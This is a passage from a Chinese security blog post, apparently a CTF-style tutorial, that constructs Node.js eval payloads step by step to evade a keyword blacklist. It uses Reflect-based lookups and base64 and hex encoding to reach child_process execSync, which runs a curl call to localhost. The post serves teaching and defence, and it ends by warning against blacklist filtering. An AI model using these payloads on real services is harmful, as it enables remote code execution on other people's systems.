+</code></pre></div><p>由于关键字过滤掉了单双引号，这里可以全部换成反引号。没有过滤掉<code>Reflect</code>，考虑用反射调用函数实现RCE。利用上面提到的几点，逐步构造一个非预期的payload。首先，由于过滤了<code>child_process</code>还有<code>require</code>关键字，我想到的是base64编码一下再执行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">eval(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span style="color:#e6db74">`base64`</span>).<span style="color:#a6e22e">toString</span>())
+</code></pre></div><p>这里过滤了<code>base64</code>，可以直接换成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#e6db74">`base`</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#ae81ff">64</span>)
+</code></pre></div><p>过滤掉了<code>Buffer</code>，可以换成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>)))
+</code></pre></div><p>要拿到<code>Buffer.from</code>方法，可以通过下标</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>))))[<span style="color:#ae81ff">1</span>]
+</code></pre></div><p>但问题在于，关键字还过滤了中括号，这一点简单，再加一层<code>Reflect.get</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>)))),<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>所以基本payload变成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>)))),<span style="color:#ae81ff">1</span>)(<span style="color:#e6db74">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span style="color:#e6db74">`base`</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#ae81ff">64</span>)).<span style="color:#a6e22e">toString</span>()
+</code></pre></div><p>但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eva&#39;</span>)))(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>)))),<span style="color:#ae81ff">1</span>)(<span style="color:#e6db74">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span style="color:#e6db74">`base`</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#ae81ff">64</span>)).<span style="color:#a6e22e">toString</span>())
+</code></pre></div><p>在能拿到<code>Buffer.from</code>的情况下，用16进制编码也一样.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;eva&#39;</span>)))(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">`Buf`</span>)))),<span style="color:#ae81ff">1</span>)(<span style="color:#e6db74">`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e6328226375726c203132372e302e302e313a313233342229`</span>,<span style="color:#e6db74">`he`</span>.<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">`x`</span>)).<span style="color:#a6e22e">toString</span>())
+</code></pre></div><p>当然，由于前面提到的16进制和字符串的特性，也可以拿到eval后直接传16进制字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">global</span>, <span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">ownKeys</span>(<span style="color:#a6e22e">global</span>).<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">`eva`</span>)))(<span style="color:#e6db74">`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`</span>)
+</code></pre></div><p>感觉nodejs中对字符串的处理方式太灵活了，如果能eval的地方，最好还是不要用字符串黑名单做过滤吧。</p>
+<p>感谢我前端大哥<a href="https://blog.semesse.me/">semesse</a>的帮助</p>
+<h1 id="参考链接">参考链接</h1>
+<ol>
+<li><a href="https://xz.aliyun.com/t/9167">https://xz.aliyun.com/t/9167</a></li>
+<li><a href="https://camp.hackingfor.fun/">https://camp.hackingfor.fun/</a></li>
+</ol>
+
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="http://segogt.github.io/">sakai</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="http://segogt.github.io/post/nodejs%E4%B8%AD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/">http://segogt.github.io/post/nodejs%E4%B8%AD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/">diceCTF2020 Web题解</a></li>
+        
+        <li><a href="/post/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8E%E5%8F%8D%E5%BC%B9shell/">文件描述符、重定向与反弹shell</a></li>
+        
+        <li><a href="/post/ubuntu18-04-%E7%BC%96%E8%AF%91glibc-2-23/">ubuntu18.04 编译glibc-2.23</a></li>
+        
+        <li><a href="/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/">linux堆笔记(二)——堆相关的数据操作</a></li>
+        
+        <li><a href="/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">linux堆笔记(一)——堆相关的数据结构</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='/tags/nodejs'>nodejs</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "segogt/blog-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2021 <a href="http://segogt.github.io/">sakai&#39;s blog By sakai</a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script><script src="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='http://segogt.github.io/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="http://segogt.github.io/">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="http://segogt.github.io/post/nodejs%E4%B8%AD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/" title="Nodejs中代码执行绕过的一些技巧">Nodejs中代码执行绕过的一些技巧</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/" title="diceCTF2020 Web题解">diceCTF2020 Web题解</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8E%E5%8F%8D%E5%BC%B9shell/" title="文件描述符、重定向与反弹shell">文件描述符、重定向与反弹shell</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/ubuntu18-04-%E7%BC%96%E8%AF%91glibc-2-23/" title="ubuntu18.04 编译glibc-2.23">ubuntu18.04 编译glibc-2.23</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" title="linux堆笔记(二)——堆相关的数据操作">linux堆笔记(二)——堆相关的数据操作</a>
+    </li>
+    
+    <li>
+        <a href="http://segogt.github.io/post/linux%E5%A0%86%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="linux堆笔记(一)——堆相关的数据结构">linux堆笔记(一)——堆相关的数据结构</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
+<ul class="widget-list">
+    
+    <li><a href="http://segogt.github.io/categories/ctf/">ctf (4)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/pwn/">pwn (2)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/web/">web (2)</a></li>
+    
+    <li><a href="http://segogt.github.io/categories/%E6%99%AE%E9%80%9A%E7%9A%84linux%E7%9F%A5%E8%AF%86/">普通的linux知识 (2)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="http://segogt.github.io/tags/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a>
+    
+    <a href="http://segogt.github.io/tags/linux/">linux</a>
+    
+    <a href="http://segogt.github.io/tags/nodejs/">nodejs</a>
+    
+    <a href="http://segogt.github.io/tags/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9B%B8%E5%85%B3/">内存分配相关</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="http://segogt.github.io/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
